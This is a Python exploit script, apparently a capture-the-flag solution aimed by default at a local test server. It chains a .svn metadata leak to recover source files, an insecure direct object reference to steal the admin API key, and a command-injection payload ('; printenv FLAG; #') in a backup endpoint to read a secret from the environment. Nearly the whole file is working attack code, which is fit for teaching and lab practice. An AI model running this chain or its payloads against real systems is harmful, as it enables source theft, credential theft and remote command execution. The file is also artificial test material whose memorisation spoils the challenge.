#!/usr/bin/env python3
# Usage: python3 exp.py [base_url]      (default http://127.0.0.1:3000)
#
# Full chain: .svn metadata leak -> source recovery -> IDOR to steal admin
# apiKey -> command injection in /admin/backup -> read FLAG from env.
import json
import os
import re
import sqlite3
import sys
import tempfile
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000").rstrip("/")


def http(path, method="GET", data=None, headers=None):
    req = urllib.request.Request(BASE + path, method=method, data=data)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read()


def recover_sources():
    """Download wc.db, walk the NODES table, fetch pristine files."""
    print("[*] fetching /.svn/wc.db")
    db_bytes = http("/.svn/wc.db")
    fd, db_path = tempfile.mkstemp(suffix=".db")
    os.write(fd, db_bytes)
    os.close(fd)

    files = {}
    try:
        con = sqlite3.connect(db_path)
        rows = con.execute(
            "SELECT local_relpath, checksum FROM NODES "
            "WHERE op_depth = 0 AND checksum IS NOT NULL"
        ).fetchall()
        con.close()
    finally:
        os.unlink(db_path)

    for relpath, checksum in rows:
        m = re.match(r"\$sha1\$([0-9a-f]{40})", checksum or "")
        if not m:
            continue
        sha1 = m.group(1)
        url = f"/.svn/pristine/{sha1[:2]}/{sha1}.svn-base"
        try:
            files[relpath] = http(url)
        except Exception as exc:  # noqa: BLE001
            print(f"[!] {relpath}: {exc}")

    print(f"[*] recovered {len(files)} file(s): {', '.join(sorted(files))}")
    return files


def find_admin_id(files):
    """Read the recovered server.js to learn which id is the admin."""
    server = b""
    for path, content in files.items():
        if path.endswith("server.js"):
            server = content
            break
    text = server.decode("utf-8", "replace")
    m = re.search(r"id:\s*(\d+),\s*username:\s*'admin'", text)
    if m:
        return int(m.group(1))
    return 1


def main():
    files = recover_sources()
    admin_id = find_admin_id(files)
    print(f"[*] admin account id = {admin_id}")

    print(f"[*] IDOR: GET /api/profile/{admin_id}")
    profile = json.loads(http(f"/api/profile/{admin_id}"))
    api_key = profile.get("apiKey")
    if not api_key:
        sys.exit("[-] no apiKey in admin profile - unexpected build")
    print(f"[*] admin apiKey = {api_key}")

    print("[*] RCE: POST /admin/backup target='; printenv FLAG; #'")
    body = json.dumps({"target": "; printenv FLAG; #"}).encode()
    resp = json.loads(
        http(
            "/admin/backup",
            method="POST",
            data=body,
            headers={"content-type": "application/json", "x-api-key": api_key},
        )
    )

    blob = (resp.get("stdout") or "") + (resp.get("stderr") or "")
    m = re.search(r"HCTF\{[^}]*\}", blob)
    if m:
        print(f"[+] flag: {m.group(0)}")
    else:
        sys.exit(f"[-] flag not found in command output: {resp}")


if __name__ == "__main__":
    main()
